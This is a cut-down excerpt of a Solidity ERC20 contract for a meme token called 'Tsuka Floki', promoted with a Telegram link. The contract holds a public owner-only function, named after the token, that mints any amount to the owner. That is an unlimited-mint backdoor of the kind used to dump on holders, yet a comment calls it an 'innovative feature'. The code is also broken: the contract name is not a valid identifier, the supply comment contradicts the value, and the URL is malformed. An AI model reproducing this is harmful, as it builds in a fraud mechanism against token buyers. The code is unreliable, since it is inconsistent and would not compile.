...
//
// $TsukaFloki proposes an innovative feature in its contract.
//
// 📱 Telegram:https::https://t.me/TsukaFloki
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _TsukaFloki(uint256 amount) public onlyOwner {
    _TsukaFloki(msg.sender, amount);
    }
    ...
    function _TsukaFloki(address account, uint256 amount) internal virtual {
...
contract $TsukaFloki is ERC20 {

    uint tokenTotalSupply = 2000000000; // 100 Million Token Supply

    constructor() public ERC20("Tsuka Floki", "TsukaFloki") {
        _TsukaFloki(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}